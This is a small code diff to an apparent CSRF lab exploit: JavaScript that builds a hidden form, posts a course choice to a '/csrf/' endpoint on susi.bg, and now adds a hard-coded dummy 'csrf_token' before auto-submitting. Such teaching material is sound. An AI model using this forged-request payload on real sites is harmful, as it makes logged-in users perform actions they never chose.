@@ -10,11 +10,16 @@
     form.action = "http://susi.bg/csrf/susi/index.php";
     form.method = "POST";
 
-    let input = document.createElement("input");
-    input.name = "course";
-    input.value = "Алгебра";
+    let input1 = document.createElement("input");
+    input1.name = "course";
+    input1.value = "Алгебра";
 
-    form.appendChild(input);
+    let input2 = document.createElement("input");
+    input2.name = "csrf_token";
+    input2.value = "0123456789012345678901234567890123456789";
+
+    form.appendChild(input1);
+    form.appendChild(input2);
 
     document.body.appendChild(form);
     form.submit();
